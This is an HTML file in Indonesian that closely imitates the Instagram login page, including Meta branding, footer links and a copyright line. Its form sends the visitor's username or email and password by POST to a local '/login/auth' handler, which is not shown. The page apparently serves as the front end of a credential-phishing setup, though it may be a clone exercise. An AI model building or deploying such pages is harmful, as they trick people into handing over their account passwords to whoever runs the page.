<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Instagram - Masuk</title>
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <!-- Tambahkan Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <style>
    :root{
      --bg:#fff;
      --card:#fff;
      --muted:#8e8e8e;
      --primary:#0095f6;
      --input-border:#dbdbdb;
      --rounded:12px;
    }
    *{box-sizing:border-box}

    /* 🚀 Hilangkan semua shadow & bayangan */
    * {
      box-shadow: none !important;
      text-shadow: none !important;
    }

    body{
      margin:0;
      font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background:var(--bg);
      color:#111;
      display:flex;
      flex-direction:column;
      min-height:100vh;
      padding:32px;
    }

    .wrap{
      display:flex;
      gap:48px;
      align-items:center;
      justify-content:center;
      flex:1;
      max-width:1100px;
      margin:0 auto;
      width:100%;
    }

    /* left ilustration panel */
    .panel-visual{
      flex:1;
      min-width:360px;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .phone-stack{
      width:320px;
      height:540px;
      background:
        radial-gradient(1200px 200px at 0% 0%, rgba(0,149,246,0.06), transparent),
        linear-gradient(180deg,#ffffff 0%, #f6f9ff 100%);
    }
    .feed img{
      width:140%;
      height:100%;
      object-fit:cover;
      border-radius:18px;
      display:block;
      border:none;
      margin-top:60px;
    }

    /* right login card */
    .card-login{
      width:360px;
      background:var(--card);
      border-radius:12px;
      padding:28px;
      display:flex;
      flex-direction:column;
      gap:12px;
      align-items:stretch;
    }
    .logo{
      font-family: "Pacifico", cursive;
      font-size:38px;
      text-align:center;
      color:#111;
      margin-bottom:6px;
      font-weight:400;
    }
    .subtitle{
      text-align:center;
      color:var(--muted);
      font-size:13px;
      margin-bottom:8px;
    }
    form{
      display:flex;
      flex-direction:column;
      gap:8px;
    }
    input[type="text"], 
    input[type="password"]{
      padding:10px 12px;
      border-radius:6px;
      border:1px solid var(--input-border);
      background:#fafafa;
      font-size:14px;
      outline:none;
    }
    input:focus{
      border-color:#bcdffb;
    }
    button.primary{
      margin-top:4px;
      padding:9px 12px;
      border-radius:6px;
      border:none;
      background:var(--primary);
      color:white;
      font-weight:600;
      cursor:pointer;
    }
    .or{
      display:flex;
      align-items:center;
      text-align:center;
      gap:10px;
      color:var(--muted);
      font-size:13px;
      margin:6px 0;
    }
    .or::before, .or::after{
      content:"";
      height:1px;
      background:var(--input-border);
      flex:1;
    }
    .link{
      text-align:center;
      color:var(--primary);
      font-weight:600;
      font-size:13px;
      text-decoration:none;
    }
    .small-muted{
      color:var(--muted);
      font-size:13px;
      text-align:center;
      margin-top:8px;
    }
    .card-signup{
      margin-top:12px;
      width:360px;
      background:var(--card);
      border-radius:12px;
      padding:16px;
      text-align:center;
      font-size:14px;
    }

    /* Tambahkan style untuk ikon Facebook */
    .fa-facebook {
      color: #1877f3;
      margin-right: 6px;
      font-size: 17px;
      vertical-align: middle;
    }

    /* === FOOTER STYLE === */
    footer{
      padding:24px 16px 32px;
      color:#8e8e8e;
      font-size:12px;
    }
    .footer-links{
      display:flex; flex-wrap:wrap;
      gap:12px 16px;
      justify-content:center;
      list-style:none; padding:0; margin:0;
    }
    .footer-links a{
      color:#8e8e8e;
      text-decoration:none;
      white-space:nowrap;
    }
    .footer-links a:hover{
      text-decoration:underline;
      color:#6b6b6b;
    }
    .footer-bottom{
      margin-top:10px;
      display:flex; gap:16px;
      justify-content:center; align-items:center;
      flex-wrap:wrap;
    }
    .lang{
      display:inline-flex; align-items:center; gap:6px;
    }
    .chev{font-size:10px; line-height:1;}

    /* responsive adjustments */
    @media (max-width:900px){
      .wrap{flex-direction:column; gap:18px; align-items:center;}
      .panel-visual{order:1}
      .card-login, .card-signup{width:320px}
      .phone-stack{transform:scale(0.9)}
    }
    @media (max-width:420px){
      body{padding:18px}
      .card-login, .card-signup{width:100%}
      .phone-stack{display:none}
    }
  </style>
</head>
<body>
  <div class="wrap" role="main">
    <!-- Bagian kiri dengan foto -->
    <div class="panel-visual" aria-hidden="true">
      <div class="phone-stack" title="Preview feed">
        <div class="feed" aria-hidden="true">
          <img src="../../public/img/gambar1.jpg" alt="Template Instagram">
        </div>
      </div>
    </div>

    <!-- Bagian kanan login -->
    <div style="display:flex;flex-direction:column;align-items:center;">
      <section class="card-login" aria-labelledby="login-title">
        <h1 id="login-title" class="logo">Instagram</h1>

        <form action="/login/auth" method="POST">
          <input id="user" name="email" type="text" placeholder="Nomor telepon, nama pengguna, atau email" required>
          <input id="pass" name="password" type="password" placeholder="Kata sandi" required>
          <button class="primary" type="submit">Masuk</button>
        </form>

        <div class="or">ATAU</div>
        <!-- Tambahkan ikon Font Awesome pada tombol Facebook -->
        <a class="link" href="#"><i class="fab fa-facebook"></i>Masuk dengan Facebook</a>
        <a href="#" style="text-align:center;display:block;margin-top:10px;color:var(--muted);font-size:13px;text-decoration:none">Lupa kata sandi?</a>
      </section>

      <div class="card-signup">
        Belum punya akun? <a href="#" class="link">Buat akun</a>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer>
    <ul class="footer-links">
      <li><a href="#">Meta</a></li>
      <li><a href="#">Tentang</a></li>
      <li><a href="#">Blog</a></li>
      <li><a href="#">Pekerjaan</a></li>
      <li><a href="#">Bantuan</a></li>
      <li><a href="#">API</a></li>
      <li><a href="#">Privasi</a></li>
      <li><a href="#">Ketentuan</a></li>
      <li><a href="#">Lokasi</a></li>
      <li><a href="#">Instagram Lite</a></li>
      <li><a href="#">Meta AI</a></li>
      <li><a href="#">Artikel Meta AI</a></li>
      <li><a href="#">Threads</a></li>
      <li><a href="#">Pengunggahan Kontak & Nonpengguna</a></li>
      <li><a href="#">Verifikasi Meta</a></li>
      <li><a href="#">Meta di Indonesia</a></li>
    </ul>
    <div class="footer-bottom">
      <span class="lang">Bahasa Indonesia <span class="chev">▼</span></span>
      <span>© 2026 Instagram from Meta</span>
    </div>
  </footer>
</body>
</html>